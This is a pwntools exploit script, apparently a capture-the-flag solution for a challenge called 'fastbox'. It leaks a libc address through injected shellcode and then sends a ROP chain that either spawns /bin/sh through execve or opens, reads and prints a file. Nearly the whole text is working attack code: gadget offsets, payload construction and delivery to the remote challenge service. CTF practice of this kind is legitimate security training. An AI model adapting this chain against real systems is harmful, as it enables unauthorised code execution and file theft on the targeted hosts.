from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def conn():
	if args.REMOTE:
		p=remote('fastbox.2023.ctfcompetition.com', 1337)
	else:
		p=process('./chall', env={"LD_PRELOAD":"/usr/lib/x86_64-linux-gnu/libc-2.31.so"})
	return p

def get_shell(libc):
    syscall = libc.address+0x000000000002584d
    rdi = libc.address+0x0000000000026b72
    rsi = libc.address+0x0000000000027529
    rdx_r12 = libc.address+0x000000000011c1e1
    rax = libc.address+0x000000000004a550
    bss = libc.bss
    
    pay = b''
    pay += p64(0xdeadbeefdeadbe00)
    pay += p64(0xdeadbeefdeadbe00)
    pay += p64(0xdeadbeefdeadbe00)

    pay += p64(rdi) # pop rdi
    pay += p64(libc.address+list(libc.search(b'/bin/sh'))[0]) # 0
    pay += p64(rsi) # pop rsi
    pay += p64(0x0) #addr
    pay += p64(rdx_r12) # pop rdx r12
    pay += p64(0x0) # 0
    pay += p64(0x0) # 0
    pay += p64(rax) # pop rax
    pay += p64(0x3b) # 0
    pay += p64(syscall) # syscall

    pay += p64(0xdeadbeefdeadbeef)
    pay += b'a'*(0xd0-len(pay))
    pay += p64(libc.address+0x000000000002a3e5+1)
    return pay

def get_orw(libc):
    syscall = libc.address+0x000000000002584d
    rdi = libc.address+0x0000000000026b72
    rsi = libc.address+0x0000000000027529
    rdx_r12 = libc.address+0x000000000011c1e1
    rax = libc.address+0x000000000004a550
    bss = libc.address+0x20a35d
    print(bss)
    
    pay = b''
    pay += p64(0xdeadbeefdeadbe00)
    pay += p64(0xdeadbeefdeadbe00)
    pay += p64(0xdeadbeefdeadbe00)

    pay += p64(rdi) + p64(bss+0x800)
    pay += p64(libc.symbols['gets'])
    pay += p64(rdi)+p64(bss+0x800)
    pay += p64(rsi) + p64(0)
    pay += p64(rdx_r12) + p64(0) + p64(0)
    pay += p64(rax) + p64(2)
    pay += p64(syscall)
    
    pay += p64(rdi) + p64(3)
    pay += p64(rsi) + p64(bss+0x800)
    pay += p64(rax) + p64(0)
    pay += p64(rdx_r12) + p64(0xff) + p64(0)
    pay += p64(syscall)
    
    pay += p64(rdi) + p64(1)
    pay += p64(rsi) + p64(bss+0x800)
    pay += p64(rax) + p64(1)
    pay += p64(rdx_r12) + p64(0xff) + p64(0)
    pay += p64(syscall)    
    return pay

p = conn()
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
e = ELF('./chall')

p.sendlineafter(b"[0-5]: ", b'1')
p.sendlineafter(b"Hostname: ", b'root')

pay = b''
pay += asm(shellcraft.write(1, 'rsp', 0x2000))
pay += asm(shellcraft.read(0, 'rsp', 0x2000))
pay += asm(shellcraft.write(1, 'rsp', 0x2000))

gdb.attach(p)

p.sendlineafter(b"[<1MiB]: ", str(len(pay)).encode())
p.sendline(pay)

maybe_base = p.recvuntil(b'\x7f')
maybe_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(f'leak: {hex(maybe_base)}')
libc.address = maybe_base + 0x4a9000
print(f'libc base: {hex(libc.address)}')

syscall = libc.address+0x000000000002584d
rdi = libc.address+0x0000000000026b72
rsi = libc.address+0x0000000000027529
rdx_r12 = libc.address+0x000000000011c1e1
rax = libc.address+0x000000000004a550
bss = libc.bss

# pay = get_shell(libc)
pay = get_orw(libc)

print(pay)
pause()
p.sendline(pay)

p.interactive()

